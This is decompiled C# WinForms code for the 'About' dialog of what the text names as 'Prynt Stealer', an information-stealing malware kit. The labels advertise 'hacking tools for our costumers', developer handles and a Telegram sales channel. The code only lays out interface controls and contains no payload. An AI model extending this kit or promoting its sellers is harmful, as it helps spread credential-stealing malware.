﻿namespace Server.Forms
{
	// Token: 0x02000089 RID: 137
	public partial class FormAbout : global::System.Windows.Forms.Form
	{
		// Token: 0x06000417 RID: 1047 RVA: 0x00004238 File Offset: 0x00002438
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000418 RID: 1048 RVA: 0x00023310 File Offset: 0x00021510
		private void InitializeComponent()
		{
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormAbout));
			this.splitContainer1 = new global::System.Windows.Forms.SplitContainer();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.bunifuGradientPanel3 = new global::Bunifu.UI.WinForms.BunifuGradientPanel();
			this.siticoneLabel2 = new global::Siticone.UI.WinForms.SiticoneLabel();
			this.siticoneLabel1 = new global::Siticone.UI.WinForms.SiticoneLabel();
			this.key = new global::Siticone.UI.WinForms.SiticoneLabel();
			this.label11 = new global::System.Windows.Forms.Label();
			this.label12 = new global::System.Windows.Forms.Label();
			this.siticoneCircleButton3 = new global::Siticone.UI.WinForms.SiticoneCircleButton();
			this.label13 = new global::System.Windows.Forms.Label();
			this.label14 = new global::System.Windows.Forms.Label();
			this.label15 = new global::System.Windows.Forms.Label();
			this.richTextBox1 = new global::System.Windows.Forms.RichTextBox();
			((global::System.ComponentModel.ISupportInitialize)this.splitContainer1).BeginInit();
			this.splitContainer1.Panel1.SuspendLayout();
			this.splitContainer1.Panel2.SuspendLayout();
			this.splitContainer1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			this.bunifuGradientPanel3.SuspendLayout();
			base.SuspendLayout();
			this.splitContainer1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.splitContainer1.Location = new global::System.Drawing.Point(0, 0);
			this.splitContainer1.Name = "splitContainer1";
			this.splitContainer1.Panel1.BackgroundImage = (global::System.Drawing.Image)componentResourceManager.GetObject("splitContainer1.Panel1.BackgroundImage");
			this.splitContainer1.Panel1.BackgroundImageLayout = global::System.Windows.Forms.ImageLayout.Stretch;
			this.splitContainer1.Panel1.Controls.Add(this.pictureBox1);
			this.splitContainer1.Panel2.Controls.Add(this.bunifuGradientPanel3);
			this.splitContainer1.Panel2.Controls.Add(this.richTextBox1);
			this.splitContainer1.Size = new global::System.Drawing.Size(398, 180);
			this.splitContainer1.SplitterDistance = 166;
			this.splitContainer1.TabIndex = 1;
			this.pictureBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.pictureBox1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new global::System.Drawing.Point(0, 0);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(166, 180);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 25;
			this.pictureBox1.TabStop = false;
			this.bunifuGradientPanel3.BackColor = global::System.Drawing.Color.Transparent;
			this.bunifuGradientPanel3.BackgroundImage = (global::System.Drawing.Image)componentResourceManager.GetObject("bunifuGradientPanel3.BackgroundImage");
			this.bunifuGradientPanel3.BackgroundImageLayout = global::System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuGradientPanel3.BorderRadius = 1;
			this.bunifuGradientPanel3.Controls.Add(this.siticoneLabel2);
			this.bunifuGradientPanel3.Controls.Add(this.siticoneLabel1);
			this.bunifuGradientPanel3.Controls.Add(this.key);
			this.bunifuGradientPanel3.Controls.Add(this.label11);
			this.bunifuGradientPanel3.Controls.Add(this.label12);
			this.bunifuGradientPanel3.Controls.Add(this.siticoneCircleButton3);
			this.bunifuGradientPanel3.Controls.Add(this.label13);
			this.bunifuGradientPanel3.Controls.Add(this.label14);
			this.bunifuGradientPanel3.Controls.Add(this.label15);
			this.bunifuGradientPanel3.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.bunifuGradientPanel3.GradientBottomLeft = global::System.Drawing.Color.DodgerBlue;
			this.bunifuGradientPanel3.GradientBottomRight = global::System.Drawing.Color.DodgerBlue;
			this.bunifuGradientPanel3.GradientTopLeft = global::System.Drawing.Color.Navy;
			this.bunifuGradientPanel3.GradientTopRight = global::System.Drawing.Color.Navy;
			this.bunifuGradientPanel3.Location = new global::System.Drawing.Point(0, 0);
			this.bunifuGradientPanel3.Name = "bunifuGradientPanel3";
			this.bunifuGradientPanel3.Quality = 10;
			this.bunifuGradientPanel3.Size = new global::System.Drawing.Size(228, 180);
			this.bunifuGradientPanel3.TabIndex = 4;
			this.siticoneLabel2.BackColor = global::System.Drawing.Color.Transparent;
			this.siticoneLabel2.Font = new global::System.Drawing.Font("Segoe UI", 9.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel2.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.siticoneLabel2.Location = new global::System.Drawing.Point(15, 123);
			this.siticoneLabel2.Margin = new global::System.Windows.Forms.Padding(2);
			this.siticoneLabel2.Name = "siticoneLabel2";
			this.siticoneLabel2.Size = new global::System.Drawing.Size(115, 19);
			this.siticoneLabel2.TabIndex = 57;
			this.siticoneLabel2.Text = "Telegram Channel";
			this.siticoneLabel2.Click += new global::System.EventHandler(this.siticoneLabel2_Click);
			this.siticoneLabel1.BackColor = global::System.Drawing.Color.Transparent;
			this.siticoneLabel1.Font = new global::System.Drawing.Font("Segoe UI", 9.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel1.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.siticoneLabel1.Location = new global::System.Drawing.Point(10, 64);
			this.siticoneLabel1.Margin = new global::System.Windows.Forms.Padding(2);
			this.siticoneLabel1.Name = "siticoneLabel1";
			this.siticoneLabel1.Size = new global::System.Drawing.Size(183, 19);
			this.siticoneLabel1.TabIndex = 56;
			this.siticoneLabel1.Text = "Developer: FlatLine + Bloody";
			this.siticoneLabel1.Click += new global::System.EventHandler(this.siticoneLabel1_Click);
			this.key.BackColor = global::System.Drawing.Color.Transparent;
			this.key.Font = new global::System.Drawing.Font("Segoe UI", 9.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.key.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.key.Location = new global::System.Drawing.Point(15, 11);
			this.key.Margin = new global::System.Windows.Forms.Padding(2);
			this.key.Name = "key";
			this.key.Size = new global::System.Drawing.Size(126, 19);
			this.key.TabIndex = 55;
			this.key.Text = "Name: Prynt Stealer";
			this.label11.AutoSize = true;
			this.label11.BackColor = global::System.Drawing.Color.Transparent;
			this.label11.Font = new global::System.Drawing.Font("Bauhaus 93", 10.25f);
			this.label11.ForeColor = global::System.Drawing.Color.White;
			this.label11.Location = new global::System.Drawing.Point(157, 377);
			this.label11.Name = "label11";
			this.label11.Size = new global::System.Drawing.Size(159, 48);
			this.label11.TabIndex = 24;
			this.label11.Text = "@FlatLineStealerOfficial\r\n@youhacker55\r\n@thisIsDali";
			this.label12.AutoSize = true;
			this.label12.BackColor = global::System.Drawing.Color.Transparent;
			this.label12.Font = new global::System.Drawing.Font("Bauhaus 93", 10.25f);
			this.label12.ForeColor = global::System.Drawing.Color.White;
			this.label12.Location = new global::System.Drawing.Point(31, 392);
			this.label12.Name = "label12";
			this.label12.Size = new global::System.Drawing.Size(120, 16);
			this.label12.TabIndex = 23;
			this.label12.Text = "Ouner and Devs : ";
			this.siticoneCircleButton3.CheckedState.Parent = this.siticoneCircleButton3;
			this.siticoneCircleButton3.CustomImages.Parent = this.siticoneCircleButton3;
			this.siticoneCircleButton3.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneCircleButton3.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.siticoneCircleButton3.ForeColor = global::System.Drawing.Color.White;
			this.siticoneCircleButton3.HoveredState.Parent = this.siticoneCircleButton3;
			this.siticoneCircleButton3.Location = new global::System.Drawing.Point(141, 339);
			this.siticoneCircleButton3.Name = "siticoneCircleButton3";
			this.siticoneCircleButton3.ShadowDecoration.Mode = global::Siticone.UI.WinForms.Enums.ShadowMode.Circle;
			this.siticoneCircleButton3.ShadowDecoration.Parent = this.siticoneCircleButton3;
			this.siticoneCircleButton3.Size = new global::System.Drawing.Size(223, 26);
			this.siticoneCircleButton3.TabIndex = 22;
			this.siticoneCircleButton3.Text = "https://t.me/officialpryntsoftware";
			this.label13.AutoSize = true;
			this.label13.BackColor = global::System.Drawing.Color.Transparent;
			this.label13.Font = new global::System.Drawing.Font("Bauhaus 93", 10.25f);
			this.label13.ForeColor = global::System.Drawing.Color.White;
			this.label13.Location = new global::System.Drawing.Point(31, 344);
			this.label13.Name = "label13";
			this.label13.Size = new global::System.Drawing.Size(106, 16);
			this.label13.TabIndex = 21;
			this.label13.Text = "Our Telegram : ";
			this.label14.AutoSize = true;
			this.label14.BackColor = global::System.Drawing.Color.Transparent;
			this.label14.Font = new global::System.Drawing.Font("Bauhaus 93", 10.25f);
			this.label14.ForeColor = global::System.Drawing.Color.White;
			this.label14.Location = new global::System.Drawing.Point(31, 267);
			this.label14.Name = "label14";
			this.label14.Size = new global::System.Drawing.Size(284, 32);
			this.label14.TabIndex = 20;
			this.label14.Text = "We tend to provide the best quality hacking\r\n tools for our costumers.";
			this.label15.AutoSize = true;
			this.label15.BackColor = global::System.Drawing.Color.Transparent;
			this.label15.Font = new global::System.Drawing.Font("Bauhaus 93", 10.25f);
			this.label15.ForeColor = global::System.Drawing.Color.White;
			this.label15.Location = new global::System.Drawing.Point(31, 239);
			this.label15.Name = "label15";
			this.label15.Size = new global::System.Drawing.Size(309, 16);
			this.label15.TabIndex = 19;
			this.label15.Text = "Citizen of the world we are Prynt Stealer Team.\r\n";
			this.richTextBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.richTextBox1.DetectUrls = false;
			this.richTextBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.richTextBox1.Enabled = false;
			this.richTextBox1.Location = new global::System.Drawing.Point(0, 0);
			this.richTextBox1.Margin = new global::System.Windows.Forms.Padding(2);
			this.richTextBox1.Name = "richTextBox1";
			this.richTextBox1.ReadOnly = true;
			this.richTextBox1.ShortcutsEnabled = false;
			this.richTextBox1.Size = new global::System.Drawing.Size(228, 180);
			this.richTextBox1.TabIndex = 1;
			this.richTextBox1.Text = "Prynt ";
			this.richTextBox1.ZoomFactor = 1.101f;
			this.richTextBox1.TextChanged += new global::System.EventHandler(this.richTextBox1_TextChanged);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(398, 180);
			base.Controls.Add(this.splitContainer1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedSingle;
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "FormAbout";
			base.ShowInTaskbar = false;
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterParent;
			this.Text = "About";
			this.splitContainer1.Panel1.ResumeLayout(false);
			this.splitContainer1.Panel2.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.splitContainer1).EndInit();
			this.splitContainer1.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			this.bunifuGradientPanel3.ResumeLayout(false);
			this.bunifuGradientPanel3.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x040002E1 RID: 737
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040002E2 RID: 738
		private global::System.Windows.Forms.SplitContainer splitContainer1;

		// Token: 0x040002E3 RID: 739
		private global::System.Windows.Forms.RichTextBox richTextBox1;

		// Token: 0x040002E4 RID: 740
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x040002E5 RID: 741
		private global::Bunifu.UI.WinForms.BunifuGradientPanel bunifuGradientPanel3;

		// Token: 0x040002E6 RID: 742
		private global::System.Windows.Forms.Label label11;

		// Token: 0x040002E7 RID: 743
		private global::System.Windows.Forms.Label label12;

		// Token: 0x040002E8 RID: 744
		private global::Siticone.UI.WinForms.SiticoneCircleButton siticoneCircleButton3;

		// Token: 0x040002E9 RID: 745
		private global::System.Windows.Forms.Label label13;

		// Token: 0x040002EA RID: 746
		private global::System.Windows.Forms.Label label14;

		// Token: 0x040002EB RID: 747
		private global::System.Windows.Forms.Label label15;

		// Token: 0x040002EC RID: 748
		private global::Siticone.UI.WinForms.SiticoneLabel siticoneLabel2;

		// Token: 0x040002ED RID: 749
		private global::Siticone.UI.WinForms.SiticoneLabel siticoneLabel1;

		// Token: 0x040002EE RID: 750
		private global::Siticone.UI.WinForms.SiticoneLabel key;
	}
}
